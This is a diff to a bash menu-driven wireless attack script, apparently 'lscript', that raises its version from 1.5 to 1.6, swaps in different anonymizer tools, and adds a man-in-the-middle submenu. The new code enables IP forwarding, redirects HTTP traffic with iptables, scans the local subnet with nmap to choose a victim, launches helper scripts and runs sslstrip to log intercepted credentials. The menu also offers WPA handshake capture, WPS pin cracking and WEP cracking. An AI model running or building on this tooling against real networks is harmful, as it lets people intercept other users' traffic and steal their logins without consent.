@@ -1,5 +1,5 @@
 #! /bin/bash
-VERSION=1.5
+VERSION=1.6
 #############DEFAULTS###############
 #setting yellow-start 
 YS="\e[1;33m"
@@ -97,16 +97,17 @@ echo -e ""$YS"if"$CE") Ifconfig"
 echo -e ""$YS" 1"$CE") Enable $WLANN                      "$YS"d1"$CE") Disable $WLANN"
 echo -e ""$YS" 2"$CE") Enable $WLANNM                   "$YS"d2"$CE") Disable $WLANNM"
 echo -e ""$YS" 3"$CE") Change MAC                        "$YS"d3"$CE") Restore original MAC"
-echo -e ""$YS" 4"$CE") Enable torghost(BROKEN TOOL)      "$YS"d4"$CE") Disable torghost"
-echo -e ""$YS" 5"$CE") Enable anonym8                    "$YS"d5"$CE") Disable anonym8"
-echo -e ""$YS" 6"$CE") Status of anonym8                 "$YS"d6"$CE") Restart anonym8"
+echo -e ""$YS" 4"$CE") Enable 4nonimizer                 "$YS"d4"$CE") Disable 4nonimizer"
+echo -e ""$YS" 5"$CE") Enable anonsurf                   "$YS"d5"$CE") Disable anonsurf"
+echo -e ""$YS" 6"$CE") Status of anonsurf                "$YS"d6"$CE") Restart anonsurf"
 echo -e ""$YS" 7"$CE") View your Public IP"
 echo -e ""$YS" 8"$CE") View your MAC"
 echo -e ""$YS" 9"$CE") TOOLS"
 echo -e ""$YS"10"$CE") Handshake       (WPA-WPA2)        "$YS"start"$CE") 1 2 3"
-echo -e ""$YS"11"$CE") Find WPS pin    (WPA-WPA2)         "$YS"stop"$CE") d2 d3"
+echo -e ""$YS"11"$CE") Find WPS pin    (WPA-WPA2)         "$YS"stop"$CE") d1 d2 d3"
 echo -e ""$YS"12"$CE") WEP hacking     (WEP)            "$YS"update"$CE") Check for updates"
-echo -e "$YS 0"$CE") EXIT                             "$YS"errors"$CE") Fix some errors"
+echo -e ""$YS"13"$CE") MITM                             "$YS"errors"$CE") Fix some errors"
+echo -e "$YS 0"$CE") EXIT"
 echo "Choose: "
 read -e YORNAA
 clear
@@ -533,37 +534,37 @@ clear
 		echo -e "Done."
 	elif [ "$YORNAA" = "4" ]
 	then
-		echo -e "Enabling torghost..."
-		sleep 1
-		echo -e ""
-		echo -e "Torghost is problematic for now.Choose anonym8 instead."
-		sleep 5
-		exec bash "$0"
-		#~ torghost start
-		#~ echo -e "Done."
+		echo -e "Enabling 4nonimizer..."
+		4nonimizer start
+		echo -e "Done."
 	elif [ "$YORNAA" = "d4" ]
 	then
-		echo -e "Disabling torghost..."
-		torghost stop
+		echo -e "Disabling 4nonimizer..."
+		4nonimizer stop
 		echo -e "Done."
 	elif [ "$YORNAA" = "5" ]
 	then
-		echo -e "Enabling anonym8..."
-		anonym8 start
+		echo -e "Enabling anonsurf..."
+		anonsurf start
 		echo -e "Done."
 	elif [ "$YORNAA" = "d5" ]
 	then
-		echo -e "Disabling anonym8..."
-		anonym8 stop
+		echo -e "Disabling anonsurf..."
+		anonsurf stop
 		echo -e "Done."
 	elif [ "$YORNAA" = "6" ]
 	then
-		echo -e "Status of anonym8..."
-		anonym8 status
+		echo -e "Status of anonsurf..."
+		anonsurf status
+		echo -e "Done."
+	elif [ "$YORNAA" = "d6" ]
+	then
+		echo -e "Restarting anonsurf..."
+		anonsurf change
 		echo -e "Done."
 	elif [ "$YORNAA" = "r6" ]
 	then
-		echo -e "Restarting anonym8..."
+		echo -e "Restarting anonsurf..."
 		anonym8 change
 		echo -e "Done."
 	elif [ "$YORNAA" = "7" ]
@@ -608,6 +609,7 @@ clear
 			gnome-terminal --geometry 80x25+9999+0 -e lh1
 			sleep 1
 			exec bash "$0"
+			#~ gnome-terminal --geometry 80x25+0+0 -e l
 		fi
 	elif [ "$YORNAA" = "11" ]
 	then
@@ -648,6 +650,135 @@ clear
 			sleep 1
 			exec bash "$0"
 		fi
+	elif [ "$YORNAA" = "13" ]
+	then
+		while true
+		do
+		clear
+		echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
+		echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward "
+		echo -e ""$YS" 2"$CE") Set iptables"
+		echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
+		echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
+		echo -e ""$YS"00"$CE") Main menu"
+		echo -e ""$YS" 0"$CE") EXIT"
+		echo -e "Choose: "
+		read -e MITMCH
+		if [ "$MITMCH" = "1" ]
+		then
+			echo "1" > /proc/sys/net/ipv4/ip_forward
+			echo -e "Done."
+			sleep 1
+		elif [ "$MITMCH" = "d1" ]
+		then
+			echo "0" > /proc/sys/net/ipv4/ip_forward
+			echo -e "Done."
+			sleep 1
+		elif [ "$MITMCH" = "2" ]
+		then
+			clear
+			echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
+			read PORTTCP
+			if [ "$PORTTCP" = "" ]
+			then
+				PORTTCP="8080"
+			fi
+						clear
+			echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
+			read PORTUDP
+			if [ "$PORTUDP" = "" ]
+			then
+				PORTUDP="40"
+			fi
+			iptables --flush
+			iptables --flush -t nat
+			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
+			iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
+			echo -e "Done."
+			sleep 1
+		elif [ "$MITMCH" = "3" ]
+		then
+			clear
+			route -n
+			echo -e ""
+			echo -e ""
+			echo -e "Enter your gateway(prefer eth0 gateway):"
+			read GATENM
+			echo -e ""
+			echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
+			read GATEINT
+			if [ "$GATEINT" = "" ]
+			then
+				GATEINT="eth0"
+			fi
+			clear		
+			nmap -sP "$GATENM"/24
+			echo -e ""
+			echo -e ""
+			echo -e "Enter your target IP:"
+			read TARGIP
+			echo -e ""
+			echo -e "$PAKTC"
+			read
+			export GATENM
+			export GATEINT
+			export TARGIP
+			export PORTTCP
+			export PORTUDP
+			cd /root/lscript/ls
+			gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
+			gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
+			gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
+			sslstrip -l $PORTTCP -w /root/sslstrip.log
+			echo -e "$PAKTGB"
+			read
+			continue
+		elif [ "$MITMCH" = "33" ]
+		then
+			clear
+			echo -e "Enter your gateway(prefer eth0 gateway):"
+			read GATENM
+			echo -e ""
+			echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
+			read GATEINT
+			if [ "$GATEINT" = "" ]
+			then
+				GATEINT="eth0"
+			fi
+			clear
+			echo -e "Enter your target IP:"
+			read TARGIP
+			echo -e ""
+			echo -e "$PAKTC"
+			read
+			export GATENM
+			export GATEINT
+			export TARGIP
+			export PORTTCP
+			export PORTUDP
+			cd /root/lscript/ls
+			gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
+			gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
+			gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
+			sslstrip -l $PORTTCP -w /root/sslstrip.log
+			echo -e "$PAKTGB"
+			read
+			continue
+		elif [ "$MITMCH" = "4" ]
+		then
+			leafpad /root/sslstrip.log
+		#~ elif [ "$MITMCH" = "44" ]
+		#~ then
+		elif [ "$MITMCH" = "00" ]
+		then
+			clear
+			exec bash "$0"
+		elif [ "$MITMCH" = "0" ]
+		then
+			clear
+			exit
+		fi
+		done
 	elif [ "$YORNAA" = "update" ]
 	then
 		#----------update-check-----------
@@ -727,6 +858,7 @@ clear
 			echo -e ""
 			echo -e "$PAKTGB"
 			read
+			exec bash "$0"
 		fi
 	elif [ "$YORNAA" = "if" ]
 	then
@@ -807,10 +939,10 @@ clear
 		rfkill unblock wifi; rfkill unblock all
 		ifconfig $WLANN up
 		echo -e "$WLANN enabled"
-		echo -e "Changing MAC of $WLANN to 00:11:22:33:44:55..."
-		ifconfig $WLANN down
-		macchanger -m 00:11:22:33:44:55 $WLANN | grep "New MAC:"
-		ifconfig $WLANN up
+		#~ echo -e "Changing MAC of $WLANN to 00:11:22:33:44:55..."
+		#~ ifconfig $WLANN down
+		#~ macchanger -m 00:11:22:33:44:55 $WLANN | grep "New MAC:"
+		#~ ifconfig $WLANN up
 		echo -e "Enabling $WLANNM..."
 		echo -e "Killing services..."
 		airmon-ng check kill
